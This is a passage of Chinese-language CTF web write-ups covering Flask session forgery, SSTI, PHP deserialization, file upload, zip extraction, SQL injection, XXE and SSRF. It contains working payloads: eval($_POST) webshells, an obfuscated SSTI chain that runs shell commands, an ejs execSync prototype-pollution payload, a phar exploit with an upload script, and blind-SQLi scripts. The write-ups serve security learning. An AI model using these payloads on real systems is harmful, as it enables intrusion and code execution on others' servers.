somethings</a>'\n\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('^file.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m or n:\n            return 'No Hack'\n        res = urllib.urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print str(ex)\n    return 'no response'\n\n@app.route('/flag')\ndef flag():\n    if session and session['username'] == 'fuck':\n        return open('/flag.txt').read()\n    else:\n        return 'Access denied'\n\nif __name__=='__main__':\n    app.run(\n        debug=True,\n        host=\"0.0.0.0\"\n    )\n\n```\n\n可以看到如果想拿到flag，就要在session处构造username为fuck，再看`SECRET_KEY`处\n\n`random.seed(uuid.getnode())`这里的getnode用于获取网络接口的mac地址，如果机器有多个mac地址，则返回通用管理的mac地址\n\n`str(random.random()*233)`此处的随机数由于之前播撒了种子，所以生成的是伪随机数\n\n所以要先读一下环境的网卡地址`/sys/class/net/eth0/address`，然后用脚本得到SECRET_KEY\n\n```python\nrandom.seed(0xae3fa6c532bd)\nrandStr = str(random.random()*233)\nprint(randStr)\n```\n\n伪造session\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png)\n\n上传发现不行，寄了\n"},{"title":"CTFshow黑盒测试","url":"/posts/c8094d2d.html","content":"\n**380**\n\n扫目录扫除page.php文件\n\n打开提示文件不存在，传参包含flag.php\n\n**381**\n\n```\n打开page_$id.php失败\n```\n\n这次变了，目录穿越能拿到源码，但没有什么用，回首页发现css文件路径很奇怪，访问得到flag\n\n**382**\n\n同上题目录，不过需要登录，万能密码即可\n\n**383**\n\n同上\n\n**384**\n\n提示：`密码前2位是小写字母，后三位是数字`\n\n爆破咯，结果是xy123\n\n"},{"title":"Dest0g3 520迎新赛","url":"/posts/41a3f068.html","content":"\n## phpdest\n\n包含log文件改User-Agent\n\n```\npayload:\n?file=/var/log/nginx/access.log\n\nUser-Agent: <?php var_dump($flag);?>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png)\n\n\n\n## EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\ntime条件是不可能满足了，看下面的自定义错误函数，只需要让程序产生错误就行，.运算用于拼接字符串，传入数组即可\n\n```\npayload:\nPOST\nctf[]=1\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png)\n\n## SimpleRCE\n\nglob协议得到文件名，再使用fopen打开文件，fread读取内容\n\n```\npayload:\nPOST\naaa=echo(fread(fopen(end(glob('/f*')),'r'),100));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png)\n\n## EasySSTI\n\n先给个一次性payload\n\n```\nusername={%25set%0dpoint=config|string|truncate(4)|last%25}\n{%25set%0dcxhx=config|join|truncate(28)|replace(point,wu)|last%25}\n{%25set%0dca=config|join|truncate(23)|replace(point,wu)|last|lower%25}\n{%25set%0dcb=config|join|truncate(9)|replace(point,wu)|last|lower%25}\n{%25set%0dcc=config|join|truncate(31)|replace(point,wu)|last|lower%25}\n{%25set%0dcd=config|join|truncate(7)|replace(point,wu)|last|lower%25}\n{%25set%0dce=config|join|truncate(4)|replace(point,wu)|last|lower%25}\n{%25set%0dcf=config|join|truncate(98)|replace(point,wu)|last|lower%25}\n{%25set%0dcg=config|join|truncate(11)|replace(point,wu)|last|lower%25}\n{%25set%0dch=config|join|truncate(203)|replace(point,wu)|last|lower%25}\n{%25set%0dci=config|join|truncate(16)|replace(point,wu)|last|lower%25}\n{%25set%0dcj=config|join|truncate(429)|replace(point,wu)|last|lower%25}\n{%25set%0dck=config|join|truncate(75)|replace(point,wu)|last|lower%25}\n{%25set%0dcl=config|join|truncate(96)|replace(point,wu)|last|lower%25}\n{%25set%0dcm=config|join|truncate(81)|replace(point,wu)|last|lower%25}\n{%25set%0dcn=config|join|truncate(5)|replace(point,wu)|last|lower%25}\n{%25set%0dco=config|join|truncate(21)|replace(point,wu)|last|lower%25}\n{%25set%0dcp=config|join|truncate(19)|replace(point,wu)|last|lower%25}\n{%25set%0dcq=config|join|truncate(294)|replace(point,wu)|last|lower%25}\n{%25set%0dcr=config|join|truncate(20)|replace(point,wu)|last|lower%25}\n{%25set%0dcs=config|join|truncate(14)|replace(point,wu)|last|lower%25}\n{%25set%0dct=config|join|truncate(12)|replace(point,wu)|last|lower%25}\n{%25set%0dcu=config|join|truncate(10)|replace(point,wu)|last|lower%25}\n{%25set%0dcv=config|join|truncate(6)|replace(point,wu)|last|lower%25}\n{%25set%0dcx=config|join|truncate(30)|replace(point,wu)|last|lower%25}\n{%25set%0dcy=config|join|truncate(77)|replace(point,wu)|last|lower%25}\n{%25set%0dcz=config|join|truncate(533)|replace(point,wu)|last|lower%25}\n{%25set%0dglo=cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dcla=cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dooo=lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25}\n{%25set%0da1=config|string|truncate(300)|replace(point,wu)|list%25}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dgang=a1|attr(cp%2Bco%2Bcp)()%25}\n{%25set%0da2=config|list|string|truncate(20)|replace(point,wu)|list%25}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dspace=a2|attr(cp%2Bco%2Bcp)()%25}\n{{ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()}}\n```\n\nban的真多////////////\n\n一个获取所有字母的小脚本\n\n```python\nstr=\"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE\"\nfor i in \"abcdefghijklmnopqrstuvwxyz\":\n    kkk=0\n    for j in str:\n        if i==j.lower():\n            print(j)\n            ini=str.find(j)+4\n            print(f\"字符{i}：set%0dc{i}=config|join|truncate({ini})|replace(point,wu)|last|lower\")\n            break\n```\n\n使用做出的字符变量拼接使用，反复使用pop直到拿到自己想要的字符，最后将os模块pop出进行使用（这也导致了这个payload只能一次性使用，使用一次破坏一次环境）\n\n## funny_upload\n\n.htaccess解析漏洞\n\n先构造htaccess文件内容\n\n```\nAddType application/x-httpd-php .png\n```\n\n上传图片发现确实被以php文件解析了，而后尝试构造图片马，最终发现`<?`被过滤，尝试各种标签（php7不支持）绕过无果，00%截断无果，查询得知htaccess也有类似.user.ini的文件包含功能`php_value auto_append_file  \"文件名\"`相当于执行`include(\"文件名\")`此处可使用PHP过滤器，所以可以先构造a文件包含base64编码后的木马，而后再使用过滤器解码包含执行\n\n```\n//1.png\nPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs/Pg==\n//.htaccess\nAddType application/x-httpd-php .png\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.png\"\n```\n\n此时再上传任意png并访问即可执行图片马（居然还ban系统命令执行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png)\n\n**后面就是跟着各位大佬WP做出来并且学习到的新知识啦**\n\n## PharPOP\n\n进去之后首先发现传不进去东西，由于Error的存在直接传入无法调用`__destruct`方法也就不能上传文件，看了大佬wp发现是通过构造和反序列化字符串不相等的变量声明数量来导致反序列化过程报错，使得内容被销毁执行`__destruct`方法\n\n下一步就是构造反序列化链了，最终利用到的是air中的`__set`方法利用PHP原生类读文件\n\n> 要触发air类的`__set`魔术方法，需要给不可访问属性赋值，apple类中`__get`有赋值 ，触发`__get`需要读取不可访问属性的值，需要触发tree中`__call`，`__call`是要调用内部不存在的方法，tree中`__destruct`方法内return $this->name();。\n>\n> 再回到air类，我们需要p(value)，p为DirectoryIterator，value为glob://xxxx，又因为apple-get触发air-set，所以apple-flag的值会传给 value，所以让`apple ->flag=‘glob://xxx’` 对于$p，air-get中$p=nana中不存在act属性，`_̲_get`被触发，返回act，…p为act，所以让act=DirectoryIterator。\n>\n> 回到最外层的tree，要触发`__destruct`方法需要利用phpGC机制\n>\n> ————————————————\n> 原文链接：https://blog.csdn.net/weixin_46081055/article/details/125046554\n\n最终构造的exp如下\n\n```php\n<?php\nclass air{\n    public $p;\n}\n\nclass tree{\n    public $name;\n    public $act;\n}\n\nclass apple {\n    public $xxx;\n    public $flag;\n}\nclass banana {\n}\n\n$air = new air();\n$tree = new tree();\n$apple = new apple();\n$bana =new  banana();\n$apple ->flag='glob:///f*';\n$apple ->xxx= $air ;\n$air->p=$bana;\n$bana->act=\"DirectoryIterator\";\n$tree->name= $apple;\n\n$phar = new Phar(\"phar1.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata([0=>$tree,1=>NULL]); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering(); ?>\n```\n\n在这里我们要修改一下生成的phar文件，触发php的垃圾回收机制来让tree的`__destruct`方法执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png)\n\n将此处的1修改为0\n\n因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为`tree`对象，同时我们又将`Array[0]`设置为`null`，这样前面的`tree`对象便丢失了引用，就会被GC所捕获，就可以执行`__destruct`了。\n\n此时由于phar文件被修改，所以我们需要修复一下文件签名，python脚本如下\n\n```python\nfrom hashlib import sha1\nf = open('./phar1.phar', 'rb').read() # 修改内容后的phar文件\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB\nopen('phar2.phar', 'wb').write(newf) # 写入新文件\n```\n\n下一步就是要将文件上传上去了，这里用python脚本来将内容上传\n\n```python\nimport requests\nimport gzip\nimport re\n\nurl = 'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'\n\nfile = open(\"./phar2.phar\", \"rb\") #打开文件\nfile_out = gzip.open(\"./phar.zip\", \"wb+\")#创建压缩文件对象，因为不压缩过不了WAF\nprint(file_out)\nfile_out.writelines(file)\nfile_out.close()\nfile.close()\nres=requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"w\";}',\n        0: open('./phar.zip', 'rb').read()\n    },\n)\nprint(res.text)\n# file_get_contents触发phar反序列化\nres2 = requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"r\";}',\n        0: 'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'\n    }\n)\nprint(res2.text)\n```\n\n拿到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png)\n\n## ezip\n\n首先是个zip利用的[大佬总结](https://ucasers.cn/zip在CTF-web方向中的一些用法/)，这里要利用的是这个\n\n> 这里根据zip里面压缩着的文件一个个解压，只要执行过`php_zip_extract_file`函数，相应的文件夹之下就会出现那个对应的文件。也就是说如果zip包里面第一个文件能被解压但是第二个文件有错误的话，整个命令的的执行会报错但第一个文件在报错前已经被写下来了。\n>\n> 里面有一个关于php解压漏洞的，如果压缩包其中有一个文件的文件名巨长，就会报错，但是里面的木马已经被解压了。所以直接拿那个脚本进行一波跑：\n\n```python\nimport zipfile\nimport io\n \nmf = io.BytesIO()\nwith zipfile.ZipFile(mf, mode=\"w\", compression=zipfile.ZIP_STORED) as zf:\n    zf.writestr('1.php', b'@<?php eval($_POST[1])?>')\n    zf.writestr('A'*5000, b'AAAAA')\n \nwith open(\"shell.zip\", \"wb\") as f:\n    f.write(mf.getvalue())\n```\n\n尝试读取flag发现没有权限，whoami之后发现用户为www-data，[suid提权](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)，nl命令走\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png)\n\n捞到flag\n\n## NodeSoEasy\n\n题目中给了源码，也给了所使用框架的版本号，非常明显的原型链污染，但是在ejs 3.1.7中已经将`outputFunctionName`的原型链污染漏洞修复了~~所以我用这个链子干了半天也没结果~~，看wp利用的是另一个链子`escapeFunction`\n\n```javascript\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');\",\"compileDebug\":true}}}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png)\n\n## middle\n\npickle反序列化捏，直接使用现成脚本\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"PHP反序列化原生类","url":"/posts/5b8865fe.html","content":"\n有时候反序列化会碰到没有给出足够使用的类的时候，这时我们可以利用一把PHP自带的原生类进行构造（以下内容都在PHP7环境中进行测试）\n\n**Exception**\n\n```php\n<?php\n\t\t$a=new Exception(\"1\");\n\t\techo $a;\n\t\t//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 {main}\n?>\n```\n\n我们发现传出的内容为：`Exception: 传入的字符串`如果此时正好有`eval`包裹了该类变量我们就能通过传入`xx;恶意代码;/*`达到任意命令执行的效果\n\n**FilesystemIterator**\n\n```php\n<?php\n  \t$a=new FilesystemIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n传入目录返回一个迭代器，`toString`返回迭代器的第一项，可使用glob协议进行通配\n\n**DirectoryIterator**\n\n```php\n<?php\n  \t$a=new DirectoryIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n同上\n\n**GlobIterator**\n\n```\n<?php\n$a=new GlobIterator(\"./f*\");\necho $a;\n//flag.txt\n?>\n```\n\nGlobIterator和上方这两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容\n\n**SplFileObject**\n\n```php\n<?php\n    $a=new SplFileObject(\"./flag.txt\");\n    echo $a;\n\t\t//读取文件首行内容\n?>\n```\n\nSplFileObject这个类返回的也是一个迭代器，但是可以用伪协议啊\n\n**SplFileInfo**\n\n```php\n<?php\n    $a=new SplFileInfo(\"phpinfo();\");\n    echo $a;\n    //phpinfo();\n    eval($a);\n?>\n```\n\n原封不动返回传入内容\n\n**Error**\n\n和**Exception**完全一致\n"},{"title":"ISCC2022","url":"/posts/8cbc7f95.html","content":"\n### Easy-SQL\n\nselect被ban了，只能先尝试捞出数据库了\n\n```\ndatabase：security\nuser：test\nversion：8.0.28\n```\n\n没有select只能看MySQL8的新特性了\n\n使用mysql8.x的新增命令values直接union输出\n\n**系统表更换为InnoDB表**\n\n系统表全部换成事务型的innodb表，默认的MySQL实例将不包含任何MyISAM表，除非手动创建MyISAM表\n\n**TABLE STATEMENT**\n\ntable语句是mysql8.0.19引入的语句，作用是返回表的全部内容，也就是返回表的行和列\n\n```sql\ntable mysql.user union mysql.user\n```\n\n**VALUES STATEMENT**\n\nvalues语句通过给出值的方式直接组成一个表，也就是可以把一个或者多个数据作为表来展示出来，返回的是一个表数据,当用union查询时，列数如果不对会发生报错\n\n```sql\nvalues row(1,2,3),row(2,3,4);\nvalues row(1,2,3) union values row(2,3,4);\n```\n\n利用`?id=0||('~','','','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit 1)`\n\n找到information_schema.columns中共有22列数据，脚本爆破出表名\n\n```python\nimport requests\n\nurl = \"http://59.110.159.206:7010/?id=\"\nfor k in range(732, 740):\n    table = \"\"\n    column = \"\"\n    for j in range(732, 739):\n        for l in range(1, 100):\n            for i in range(1, 127):\n                ttable = table + chr(i)\n                com = f\"0||('def','security','{ttable}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                tex = requests.get(url + com).text\n                if \"Dumb\" in tex:\n                    table = table + chr(i - 1)\n                    print(table)\n                    break\n            com = f\"0||('def','security','{table + chr(33)}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n            tex = requests.get(url + com).text\n            if \"Dumb\" in tex:\n                print(table)\n                for l in range(1, 100):\n                    for i in range(1, 127):\n                        tcolumn = column + chr(i)\n                        com = f\"0||('def','security','{table}','{tcolumn}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                        tex = requests.get(url + com).text\n                        if \"Dumb\" in tex:\n                            column = column + chr(i - 1)\n                            break\n                    com = f\"0||('def','security','{table}','{column + chr(33)}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                    tex = requests.get(url + com).text\n                    if \"Dumb\" in tex:\n                        print(table + '.' + column)\n                        break\n        break\n\n```\n\n列名同样\n\n```\nsecurity\n\tusers\n\t\tID\n\t\tUSERNAME\n\t\tPASSWD\n\temails\n\t\tG\n\t\tQ\n\t\t=\n\tflag\n\t\tG\n\t\tFe\n```\n\n使用union table来捞出邮箱\n\n```\n?id=0 union (table security.emails limit 7,1)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 16.00.43.png)\n\n看源码\n\n```php\n<?php\ninclude \"./config.php\";\n// error_reporting(0);\n// highlight_file(__FILE__);\n$conn = mysqli_connect($hostname, $username, $password, $database);\n   if ($conn->connect_errno) {\n    die(\"Connection failed: \" . $conn->connect_errno);\n} \n\necho \"Where is the database?\".\"<br>\";\n\necho \"try ?id\";\n\nfunction sqlWaf($s)\n{\n    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|\"|\\^|\\||\\ |\\'/i';\n    if (preg_match($filter,$s))\n        return False;\n    return True;\n}\n\nif (isset($_GET['id'])) \n{\n    $id = $_GET['id'];\n    $sql = \"select * from users where id=$id\";\n    $safe = preg_match('/select/is', $id);\n    if($safe!==0)\n        die(\"No select!\");\n    $result = mysqli_query($conn, $sql);\n    if ($result) \n    {\n        $row = mysqli_fetch_array($result);\n        echo \"<h3>\" . $row['username'] . \"</h3><br>\";\n        echo \"<h3>\" . $row['passwd'] . \"</h3>\";\n    }\n    else\n        die('<br>Error!');\n}\n\n\nif (isset($_POST['username']) && isset($_POST['passwd'])) \n{\n\n    $username = strval($_POST['username']);\n    $passwd = strval($_POST['passwd']);\n\n    if ( !sqlWaf($passwd) )\n        die('damn hacker');\n\n    $sql = \"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\";\n    $result = $conn->query($sql);\n    if ($result->num_rows > 0) {\n        $row = $result->fetch_assoc();\n        if ( $row['username'] === 'admin' && $row['passwd'] )\n        {\n            if ($row['passwd'] == $passwd)\n            {\n                die($flag);\n            } else {\n                die(\"username or passwd wrong, are you admin?\");\n            }\n        } else {\n            die(\"wrong user\");\n        }\n    } else {\n        die(\"user not exist or wrong passwd\");\n    }\n}\nmysqli_close($conn); \n?>\n\n```\n\n要求结果中查询出的用户名为admin并且提交的密码和查询的密码相同才能拿到flag，在passwd处做了过滤，那么我们就在username处进行注入就行了，在上面已经得到了users表共有三列，直接union select构造我们自己的username和passwd\n\n```\npayload:\nPOST\nusername='union select '1','admin','1'%23&passwd=1\n```\n\n### 冬奥会\n\narray_search弱比较，传入数字即可\n\n```\npayload:?Information={\"year\":\"2022a\",\"items\":[0,[1,2],1]}\n```\n\n### findme\n\n```php\n<?php \nhighlight_file(__FILE__); \n\nclass a{ \n    public $un0; \n    public $un1; \n    public $un2; \n    public $un3; \n    public $un4; \n     \n    public function __destruct(){ \n        if(!empty($this->un0) && empty($this->un2)){ \n            $this -> Givemeanew(); \n            if($this -> un3 === 'unserialize'){ \n                $this -> yigei(); \n            } \n            else{ \n                $this -> giao(); \n            } \n        } \n    } \n\n    public function Givemeanew(){ \n        $this -> un4 = new $this->un0($this -> un1); \n    } \n\n    public function yigei(){ \n        echo 'Your output: '.$this->un4; \n    } \n     \n    public function giao(){ \n        @eval($this->un2); \n    } \n     \n    public function __wakeup(){ \n        include $this -> un2.'hint.php'; \n    } \n} \n\n$data = $_POST['data']; \nunserialize($data);\n```\n\n原生类反序列化，先用伪协议读出提示\n\n","tags":["CTF","web"]},{"title":"CTFshowXXE","url":"/posts/949d2db6.html","content":"\n## XML基础知识\n\n要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。\n\n> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素\n\n### xml文档的构建模块\n\n所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：\n\n- 元素\n- 属性\n- 实体\n- PCDATA\n- CDATA\n\n下面是每个构建模块的简要描述。\n1，元素\n元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。\n实例:\n\n```\n<body>body text in between</body>\n<message>some message in between</message>12\n```\n\n空的 HTML 元素的例子是 \"hr\"、\"br\" 以及 \"img\"。\n\n2，属性\n属性可提供有关元素的额外信息\n实例：\n\n```\n<img src=\"computer.gif\" />1\n```\n\n3，实体\n实体是用来定义普通文本的变量。实体引用是对实体的引用。\n\n4，PCDATA\nPCDATA 的意思是被解析的字符数据（parsed character data）。\nPCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\n\n5，CDATA\nCDATA 的意思是字符数据（character data）。\nCDATA 是不会被解析器解析的文本。\n\n### DTD(文档类型定义)\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。\n\nDTD 可以在 XML 文档内声明，也可以外部引用。\n\n1，内部声明：<!DOCTYPE 根元素 [元素声明]> ex: `<!DOCTYOE test any>`\n完整实例：\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [\n  <!ELEMENT note (to,from,heading,body)>\n  <!ELEMENT to      (#PCDATA)>\n  <!ELEMENT from    (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body    (#PCDATA)>\n]>\n<note>\n  <to>George</to>\n  <from>John</from>\n  <heading>Reminder</heading>\n  <body>Don't forget the meeting!</body>\n</note>1234567891011121314\n```\n\n2，外部声明（引用外部DTD）：<!DOCTYPE 根元素 SYSTEM \"文件名\"> ex:`<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'>`\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">\n<note>\n<to>George</to>\n<from>John</from>\n<heading>Reminder</heading>\n<body>Don't forget the meeting!</body>\n</note> \n```\n\n而note.dtd的内容为:\n\n```\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n### DTD实体\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。\n***\n实体又分为一般实体和参数实体\n1，一般实体的声明语法:<!ENTITY 实体名 \"实体内容“>\n引用实体的方式：&实体名；\n2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 \"实体内容“>\n引用实体的方式：%实体名；\n\\***\n\n1，内部实体声明:<!ENTITY 实体名称 \"实体的值\"> ex:`<!ENTITY eviltest \"eviltest\">`\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY writer \"Bill Gates\">\n<!ENTITY copyright \"Copyright W3School.com.cn\">\n]>\n123456\n```\n\n<test>&writer;©right;</test>\n\n**2，外部实体声明:<!ENTITY 实体名称 SYSTEM \"URI\">**\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY writer SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n<!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n]>\n<author>&writer;&copyright;</author>123456\n```\n\n在了解了基础知识后，下面开始了解xml外部实体注入引发的问题\n","tags":["CTF","web"]},{"title":"CTFshowSSRF","url":"/posts/b1fc6cca.html","content":"\n## SSRF基础\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 相关函数和类\n\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中\nreadfile()：输出一个文件的内容\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用\nfopen()：打开一个文件文件或者 URL\nPHP原生类SoapClient在触发反序列化时可导致SSRF\n\n## 相关协议\n\nfile协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\ndict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\ngopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\nhttp/s协议：探测内网主机存活\n\n\n\n**351**\n\n```PHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n# curl_init — 初始化 cURL 会话    \n# curl_setopt — 设置一个cURL传输选项\n# curl_exec — 执行 cURL 会话\n# curl_close — 关闭 cURL 会话\n```\n\n\n\n```\npayload:\nPOST:\nurl=http://127.0.0.1/flag.php\n```\n\n**352**\n\n`parse_url`函数作用是将一个URL拆分，格式如下：\n\n```PHP\n<?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\nprint_r(parse_url($url));\n?>\n以上例程会输出：\nArray\n(\n[scheme] => http\n[host] => hostname\n[user] => username\n[pass] => password\n[path] => /path\n[query] => arg=value\n[fragment] => anchor\n)\n```\n\n同上即可\n\n**353**\n\n绕过127.0.0.1，可使用进制转换或其他IP\n\n```\n进制转换：\n整数转换过程，将每一位IP转换为二进制并进行拼接\n2130706433 //十进制整数\n0x7F.0.0.1 //十六进制\n0177.0.0.1 //八进制\n0x7F000001 //十六进制整数\n```\n\n```\n其他IP：\n127.127.127.127\n0\n0.0.0.0\n```\n\n**354**\n\n过滤没了，只能指向其他域名\n\n1、将自己域名解析为127.0.0.1\n\n2、将自己网站设置为302重定向到127.0.0.1\n\n**355**\n\n用0或者127.1\n\n0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0\n\n**356**\n\n更短了只能用0\n\n**357**\n\n```PHP\ngethostbyname — 返回主机名对应的 IPv4地址\n# php filter函数\nfilter_var()\t获取一个变量，并进行过滤\nfilter_var_array()\t获取多个变量，并进行过滤\n......\n# PHP 过滤器\nFILTER_VALIDATE_IP\t把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围\nFILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）\nFILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）\nFILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）\nFILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。\n```\n\n由于获取到了指向域名的IP值所以域名指向127.0.0.1不再生效，只能使用302重定向或者**DNS rebinding（DNS重新绑定攻击）**\n\n### DNS rebinding：\n\n```\n攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略\n回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 